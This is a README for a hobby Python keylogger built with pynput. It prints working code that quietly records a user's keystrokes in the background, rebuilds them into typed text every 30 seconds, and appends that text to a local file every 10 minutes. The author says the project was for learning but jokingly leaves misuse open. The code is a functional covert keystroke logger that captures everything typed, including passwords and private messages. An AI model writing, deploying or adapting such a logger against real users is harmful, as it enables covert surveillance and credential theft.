# Outline

- The program is a simple keylogger that runs in the background and logs the keystrokes of the users. A keylogger is often a malicious tool that is used to extract user info and while I have no intentions of using mine for the same (maybe, who knows), I was very interested in learning about how one worked and so I built my own using the pynput module. A detailed description lies below.

# Purpose:

- The program helped me understand the rudimentary nuances of a keylogger and how to make one myself, carefully extracting necessary information whilst storing it - all while running in the background. While the keylogger that I built is rather linear: given the fact that any edits are registered at the end of the sentence since the keylogger doesn't recognize mouse movement, building it helped solidify my understanding of scheduling tasks and how to work on one thread effectively.

# Description:

- Using the pynput module, registering keystrokes is a breeze and its listener makes it so that it consistently runs in the background.
- Any key that is pressed is appended to the end of a list of the keys pressed and every 30 seconds, the keys pressed are convered into words typed by the following bit of code:

    ```python
    def generate_sentence():
        global keys, written, words
        swap_case, shift_pressed, num_spaces = 0, False, 0
        for key in keys:
            if shift_pressed:
                swap_case = 0
                shift_pressed = False
            if key == Key.space:
                num_spaces += 1
                if num_spaces % 12 == 0:
                    words += '\n'
                else:
                    words += ' '
            elif key == Key.backspace:
                words = words[:-1]
            elif key == Key.enter:
                words += '\n'
            elif key == Key.shift:
                swap_case = 1
                shift_pressed = True
            elif key == Key.caps_lock:
                swap_case = 0 if swap_case else 1
            if str(key).find("Key") == -1:
                if key == '\x13':
                    continue
                elif str(key).isalpha:
                    if swap_case:
                        words += str(key).replace("'", "").swapcase()
                    else:
                        words += str(key).replace("'", "")
                elif str(key).isdigit or str(key) in string.punctuation:
                    words += str(key).replace("'", "")
        keys = []
        written = False
    ```

- This function takes care of various keys pressed such as shifts, backspace, enter etc and reflects the changes they would cause in the words that have been generated.
- Every 10 minutes, a function that writes the words generated to a txt file is called:

    ```python
    def write_file():
        global words, written
        with open(r"C:\Users\akush\Desktop\Programming\Projects\Keylogger\keys_logged.txt", 'a') as fhand:
            fhand.write("DATE: {}\n".format(date))
            fhand.write(words)
            fhand.write('\n')
            fhand.write('-'*79)
            fhand.write('\n')
        words = ''
        written = True
    ```

- These calls are made in the key_released function and while I tried to use the schedule module to call these functions, I ran into some threading issues where the listener of the pynput module would only be called once the scheduled tasks ran - I will try to fix that with multithreading but for now I used the time function in order to whip up a DIY solution for the same.

    ```python
    if curr_time - start_time_words >= 30:
            generate_sentence()
            start_time_words = time.time()

        if curr_time - start_time_list >= 600:
            write_file()
            start_time_list = time.time()
    ```

- I have left commented a piece of code I used during debugging where hitting the escape key caused the program to shut down and log whatever hadn't been generated and saved to the text file.
